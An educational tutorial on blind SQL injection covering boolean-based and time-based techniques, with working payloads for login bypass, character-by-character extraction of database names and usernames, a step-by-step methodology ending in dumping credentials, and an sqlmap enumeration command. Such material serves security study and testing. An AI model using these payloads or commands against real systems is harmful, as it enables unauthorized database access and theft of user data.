
## **What is Blind SQL Injection?**

Blind SQL Injection (Blind SQLi) is a type of SQL injection where the attacker can send malicious SQL queries but does **not directly see database errors or query results** in the application’s response.

* In other words, the application is vulnerable, but it **hides error messages and results**, making exploitation slower and more complex.
* Instead of direct feedback, attackers must **infer information indirectly** by analyzing the application’s behavior, responses, or response times.

---

## **How Blind SQL Injection Works**

1. The attacker injects SQL code into a vulnerable parameter (e.g., URL, form input, cookie).
2. Unlike classic SQLi, the server does **not show errors or output data**.
3. The attacker uses **Boolean conditions** or **deliberate time delays** to guess data bit by bit.
4. Repeatedly testing with crafted payloads allows them to **reconstruct database contents**.

---

## **Subtypes of Blind SQL Injection**

### **1. Boolean-Based Blind SQL Injection**

* Uses **True/False conditions** to infer data indirectly.
* If the condition is true → the application behaves one way (e.g., loads a page).
* If false → it behaves differently (e.g., shows a blank page, error page, or no results).
* By chaining many tests, attackers can extract database names, table names, column names, and sensitive data.

---

#### **Example: Boolean-Based Attack**

Suppose the login query looks like this:

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>';
```

**Attacker input (username field):**

```sql
' OR '1'='1
```

**Resulting query:**

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '<password>';
```

* `'1'='1` is always **true**, so the query bypasses authentication.
* The attacker may now log in as the first user in the database (often an admin).

---

#### **Information Extraction Example**

To check the **length of the database name**, the attacker could use:

```sql
' OR LENGTH(database()) > 5 --
```

* If the page loads normally → database name length > 5.
* If the page changes (or denies access) → database name length ≤ 5.
* Repeating with different numbers (binary search) reveals the exact length.

**Next step:** Extract the database name character by character:

```sql
' OR SUBSTRING(database(),1,1)='a' --
```

* If true → the first letter of the database name is **a**.
* If false → test with b, c, d... until the correct letter is found.
* Repeat until full database name is revealed.

---

### **2. Time-Based Blind SQL Injection**

* When Boolean-based inference is not possible (responses always look the same), attackers use **time delays**.
* The idea: If the query is true, the database **pauses** (using `SLEEP()`, `WAITFOR DELAY`, or `pg_sleep()` depending on DBMS).
* If false, it responds immediately.
* By measuring response time, attackers infer results.

---

#### **Example: Time-Based Attack**

**Original vulnerable query:**

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>';
```

**Injected username:**

```sql
' OR IF(1=1, SLEEP(5), 0) -- 
```

**Resulting query:**

```sql
SELECT * FROM users WHERE username = '' OR IF(1=1, SLEEP(5), 0) -- ' AND password = '<password>';
```

* Since `1=1` is true, the query runs `SLEEP(5)`.
* The server response is delayed by 5 seconds → confirming the injection worked.

**Another payload to check database length:**

```sql
' OR IF(LENGTH(database())=6, SLEEP(5), 0) -- 
```

* If the response is delayed → database name length is **6**.
* If not delayed → test another number.

---

## **Blind SQL Injection Methodology (Step-by-Step)**

### **Step 1: Identify Injection Points**

* Test all input fields (URL params, form fields, cookies, headers).
* Example:

  ```
  http://example.com/profile.php?id=1
  ```

  Test with:

  ```
  http://example.com/profile.php?id=1'
  ```
* If an error or unusual behavior occurs → possible SQL injection.

---

### **Step 2: Test for Boolean-Based Injection**

* Inject a condition that is always true:

  ```
  ?id=1' AND '1'='1
  ```
* Inject a condition that is always false:

  ```
  ?id=1' AND '1'='2
  ```
* If the responses differ → it’s Boolean-based SQLi.

---

### **Step 3: Test for Time-Based Injection**

* Inject a delay payload:

  ```
  ?id=1' AND IF(1=1, SLEEP(5), 0) --
  ```
* If the page response slows down → it’s vulnerable to Time-based SQLi.

---

### **Step 4: Extract Data Step by Step**

1. Find **database name length** using `LENGTH(database())`.
2. Extract database name **one character at a time** with `SUBSTRING()`.
3. Use **information\_schema.tables** and **information\_schema.columns** to enumerate tables and columns.
4. Dump sensitive data (usernames, passwords, emails).

---

## **Real-Life Example**

Suppose an attacker wants to extract the **first character of the first username** in the `users` table.

Payload:

```sql
' OR IF(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a', SLEEP(5), 0) --
```

* If response delayed → first letter is `a`.
* If not → try `b, c, d, … z, 0–9`.
* Repeat for each character until the full username is extracted.

---

## **Tools for Automating Blind SQLi**

While manual exploitation is possible, Blind SQL Injection is very slow. Tools like **sqlmap** automate the process:

Example with sqlmap:

```bash
sqlmap -u "http://example.com/profile.php?id=1" --batch --dbs
```

* `--dbs` → enumerate databases
* `--tables` → list tables
* `--columns` → list columns
* `--dump` → dump data

---
